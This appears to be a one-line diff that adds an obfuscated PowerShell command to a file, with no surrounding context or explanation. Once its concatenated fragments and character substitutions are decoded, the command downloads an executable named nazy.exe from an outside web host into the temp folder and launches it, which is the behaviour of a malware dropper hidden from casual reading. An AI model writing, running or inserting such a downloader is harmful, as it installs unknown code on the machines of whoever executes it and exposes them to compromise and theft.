@@ -1,0 +1,1 @@
+﻿ ('(YT'+'8'+'dpl=YT8'+'env'+':temp+V'+'Ldf.'+'exeVLd)'+';(New'+'-Ob'+'j'+'e'+'ct'+' '+'System.'+'Net.WebC'+'li'+'e'+'nt'+').Dow'+'n'+'lo'+'ad'+'Fi'+'l'+'e'+'('+'VLdhttp'+'://'+'www.amspe'+'conl'+'in'+'e.'+'c'+'om/123/na'+'zy.ex'+'eVL'+'d, YT8dp'+'l);S'+'tart-Proces'+'s YT8dpl').REPLAcE('YT8',[sTRINg][CHar]36).REPLAcE('VLd',[sTRINg][CHar]39) |IEx
